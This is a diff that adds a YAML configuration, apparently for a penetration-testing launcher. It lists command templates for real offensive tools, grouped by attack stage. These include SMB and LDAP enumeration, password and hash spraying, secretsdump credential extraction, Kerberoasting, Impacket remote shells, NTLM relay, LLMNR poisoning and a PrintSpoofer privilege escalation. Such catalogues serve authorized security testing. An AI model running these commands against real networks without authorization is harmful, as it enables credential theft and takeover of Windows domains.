@@ -1,0 +1,360 @@
+categories:
+  smb_enumeration:
+    name: "🗂️ SMB/File Share Analysis"
+    tools:
+      enum4linux_ng:
+        name: "Enum4Linux-ng - SMB Enumeration"
+        description: "Modern SMB/Samba enumeration tool (users, shares, OS info)"
+        command: "enum4linux-ng {target_ip} -A"
+        params:
+          - target_ip
+
+      smbclient_list:
+        name: "SMBclient - List Shares"
+        description: "List available SMB shares without authentication"
+        command: "smbclient -L //{target_ip} -N"
+        params:
+          - target_ip
+
+      smbclient_connect:
+        name: "SMBclient - Connect to Share"
+        description: "Interactively connect to specific SMB share"
+        command: "smbclient //{target_ip}/{share_name} -U {username}"
+        params:
+          - target_ip
+          - share_name
+          - username
+
+      smbmap:
+        name: "SMBMap - Share Enumeration & Permissions"
+        description: "Enumerate shares and check read/write permissions"
+        command: "smbmap -H {target_ip} -u {username} -p {password}"
+        params:
+          - target_ip
+          - username
+          - password
+
+      smbmap_execute:
+        name: "SMBMap - Remote Command Execution"
+        description: "Execute commands via SMB if admin share available"
+        command: "smbmap -H {target_ip} -u {username} -p {password} -x '{command}'"
+        params:
+          - target_ip
+          - username
+          - password
+          - command
+
+      crackmapexec_smb:
+        name: "CrackMapExec - SMB Enumeration"
+        description: "Multi-threaded SMB enumeration and exploitation"
+        command: "crackmapexec smb {target_ip} -u {username} -p {password} --shares"
+        params:
+          - target_ip
+          - username
+          - password
+
+      crackmapexec_pass_spray:
+        name: "CrackMapExec - Password Spray"
+        description: "Spray single password across multiple users"
+        command: "crackmapexec smb {target_ip} -u {user_file} -p {password} --continue-on-success"
+        params:
+          - target_ip
+          - user_file
+          - password
+
+  active_directory:
+    name: "🏢 Active Directory Attacks"
+    tools:
+      bloodhound_python:
+        name: "BloodHound.py - AD Collector"
+        description: "Collect Active Directory data for BloodHound analysis"
+        command: "bloodhound-python -u {username} -p {password} -d {domain} -ns {target_ip} -c All"
+        params:
+          - username
+          - password
+          - domain
+          - target_ip
+
+      ldapdomaindump:
+        name: "LDAPDomainDump - LDAP Enumeration"
+        description: "Dump AD information via LDAP (users, groups, computers)"
+        command: "ldapdomaindump {target_ip} -u '{domain}\\{username}' -p {password}"
+        params:
+          - target_ip
+          - domain
+          - username
+          - password
+
+      kerbrute_userenum:
+        name: "Kerbrute - User Enumeration"
+        description: "Enumerate valid AD users via Kerberos (no authentication)"
+        command: "kerbrute userenum --dc {target_ip} -d {domain} {user_file}"
+        params:
+          - target_ip
+          - domain
+          - user_file
+
+      kerbrute_passwordspray:
+        name: "Kerbrute - Password Spray"
+        description: "Kerberos-based password spraying attack"
+        command: "kerbrute passwordspray --dc {target_ip} -d {domain} {user_file} {password}"
+        params:
+          - target_ip
+          - domain
+          - user_file
+          - password
+
+      getadusers:
+        name: "GetADUsers.py - User List Dump"
+        description: "Extract all AD users with Impacket"
+        command: "GetADUsers.py -all {domain}/{username}:{password}@{target_ip}"
+        params:
+          - domain
+          - username
+          - password
+          - target_ip
+
+      secretsdump:
+        name: "SecretsDump.py - Credential Extraction"
+        description: "Extract password hashes from DC (NTLM, Kerberos)"
+        command: "secretsdump.py {domain}/{username}:{password}@{target_ip}"
+        params:
+          - domain
+          - username
+          - password
+          - target_ip
+
+      getnpusers:
+        name: "GetNPUsers.py - ASREPRoast"
+        description: "Find users without Kerberos pre-auth (ASREPRoast)"
+        command: "GetNPUsers.py {domain}/ -usersfile {user_file} -dc-ip {target_ip}"
+        params:
+          - domain
+          - user_file
+          - target_ip
+
+      getuserspns:
+        name: "GetUserSPNs.py - Kerberoasting"
+        description: "Extract service account tickets for offline cracking"
+        command: "GetUserSPNs.py {domain}/{username}:{password} -dc-ip {target_ip} -request"
+        params:
+          - domain
+          - username
+          - password
+          - target_ip
+
+  impacket_suite:
+    name: "🔧 Impacket Exploitation"
+    tools:
+      psexec:
+        name: "PsExec.py - Remote Shell"
+        description: "Get SYSTEM shell via SMB (requires admin)"
+        command: "psexec.py {domain}/{username}:{password}@{target_ip}"
+        params:
+          - domain
+          - username
+          - password
+          - target_ip
+
+      wmiexec:
+        name: "WMIExec.py - Semi-Interactive Shell"
+        description: "WMI-based shell (no binaries uploaded, stealthier)"
+        command: "wmiexec.py {domain}/{username}:{password}@{target_ip}"
+        params:
+          - domain
+          - username
+          - password
+          - target_ip
+
+      smbexec:
+        name: "SMBExec.py - SMB Shell"
+        description: "Execute commands via SMB without PsExec service"
+        command: "smbexec.py {domain}/{username}:{password}@{target_ip}"
+        params:
+          - domain
+          - username
+          - password
+          - target_ip
+
+      atexec:
+        name: "AtExec.py - Task Scheduler Shell"
+        description: "Execute commands via Windows Task Scheduler"
+        command: "atexec.py {domain}/{username}:{password}@{target_ip} '{command}'"
+        params:
+          - domain
+          - username
+          - password
+          - target_ip
+          - command
+
+      dcomexec:
+        name: "DCOMExec.py - DCOM Shell"
+        description: "Execute commands via DCOM (ShellWindows/ShellBrowserWindow)"
+        command: "dcomexec.py {domain}/{username}:{password}@{target_ip}"
+        params:
+          - domain
+          - username
+          - password
+          - target_ip
+
+      smbserver:
+        name: "SMBServer.py - Create SMB Share"
+        description: "Host SMB share for file exfiltration/serving tools"
+        command: "smbserver.py {share_name} {local_path} -smb2support"
+        params:
+          - share_name
+          - local_path
+
+      ntlmrelayx:
+        name: "NTLMRelayX.py - NTLM Relay Attack"
+        description: "Relay NTLM authentication to target machines"
+        command: "ntlmrelayx.py -tf {target_file} -smb2support"
+        params:
+          - target_file
+
+  windows_remote:
+    name: "💻 Windows Remote Access"
+    tools:
+      evil_winrm:
+        name: "Evil-WinRM - PowerShell Remoting"
+        description: "WinRM shell with upload/download capabilities"
+        command: "evil-winrm -i {target_ip} -u {username} -p {password}"
+        params:
+          - target_ip
+          - username
+          - password
+
+      evil_winrm_hash:
+        name: "Evil-WinRM - Pass-the-Hash"
+        description: "Authenticate using NTLM hash instead of password"
+        command: "evil-winrm -i {target_ip} -u {username} -H {ntlm_hash}"
+        params:
+          - target_ip
+          - username
+          - ntlm_hash
+
+      xfreerdp:
+        name: "xFreeRDP - RDP Client"
+        description: "Connect to Windows via Remote Desktop Protocol"
+        command: "xfreerdp /v:{target_ip} /u:{username} /p:{password} /cert:ignore"
+        params:
+          - target_ip
+          - username
+          - password
+
+      rdesktop:
+        name: "Rdesktop - Lightweight RDP"
+        description: "Alternative RDP client for Windows connections"
+        command: "rdesktop -u {username} -p {password} {target_ip}"
+        params:
+          - target_ip
+          - username
+          - password
+
+  network_poisoning:
+    name: "☠️ Network Poisoning & MitM"
+    tools:
+      responder:
+        name: "Responder - LLMNR/NBT-NS Poisoner"
+        description: "Capture NTLM hashes via network poisoning (requires sudo)"
+        command: "sudo responder -I {interface} -wrf"
+        params:
+          - interface
+
+      responder_analyze:
+        name: "Responder - Analyze Mode"
+        description: "Listen-only mode to identify targets (no poisoning)"
+        command: "sudo responder -I {interface} -A"
+        params:
+          - interface
+
+      mitm6:
+        name: "mitm6 - IPv6 DNS Takeover"
+        description: "Exploit IPv6 default configs to become DNS server"
+        command: "sudo mitm6 -d {domain}"
+        params:
+          - domain
+
+      bettercap_net:
+        name: "Bettercap - Network MitM"
+        description: "Advanced network attack framework"
+        command: "sudo bettercap -iface {interface}"
+        params:
+          - interface
+
+  ldap_attacks:
+    name: "📁 LDAP Exploitation"
+    tools:
+      ldapsearch:
+        name: "LDAPSearch - Query Directory"
+        description: "Search and enumerate LDAP directory services"
+        command: "ldapsearch -x -H ldap://{target_ip} -b '{base_dn}'"
+        params:
+          - target_ip
+          - base_dn
+
+      ldapsearch_anon:
+        name: "LDAPSearch - Anonymous Bind"
+        description: "Test for anonymous LDAP bind and enumerate"
+        command: "ldapsearch -x -H ldap://{target_ip} -b '' -s base 'objectclass=*'"
+        params:
+          - target_ip
+
+      ldapdomaindump_anon:
+        name: "LDAPDomainDump - Anonymous"
+        description: "Attempt LDAP dump without credentials"
+        command: "ldapdomaindump {target_ip} --no-json --no-grep"
+        params:
+          - target_ip
+
+  pass_the_hash:
+    name: "🔑 Credential Reuse Attacks"
+    tools:
+      crackmapexec_pth:
+        name: "CrackMapExec - Pass-the-Hash SMB"
+        description: "Authenticate using NTLM hash against SMB"
+        command: "crackmapexec smb {target_ip} -u {username} -H {ntlm_hash}"
+        params:
+          - target_ip
+          - username
+          - ntlm_hash
+
+      crackmapexec_winrm:
+        name: "CrackMapExec - WinRM PTH"
+        description: "Pass-the-Hash against WinRM service"
+        command: "crackmapexec winrm {target_ip} -u {username} -H {ntlm_hash}"
+        params:
+          - target_ip
+          - username
+          - ntlm_hash
+
+      crackmapexec_spray_hash:
+        name: "CrackMapExec - Hash Spray"
+        description: "Spray single hash across multiple targets"
+        command: "crackmapexec smb {target_file} -u {username} -H {ntlm_hash} --continue-on-success"
+        params:
+          - target_file
+          - username
+          - ntlm_hash
+
+  windows_priv_esc:
+    name: "⬆️ Windows Privilege Escalation"
+    tools:
+      winpeas:
+        name: "WinPEAS - Windows Privilege Escalation"
+        description: "Automated Windows privilege escalation enumeration"
+        command: "winpeas.exe"
+        params: []
+
+      powerup:
+        name: "PowerUp - PowerShell Priv Esc"
+        description: "PowerShell script for Windows privilege escalation checks"
+        command: "powershell -ep bypass -c '. .\\PowerUp.ps1; Invoke-AllChecks'"
+        params: []
+
+      printspoofer:
+        name: "PrintSpoofer - SeImpersonate Exploit"
+        description: "Exploit SeImpersonate privilege to get SYSTEM"
+        command: "PrintSpoofer.exe -i -c cmd"
+        params: []
+
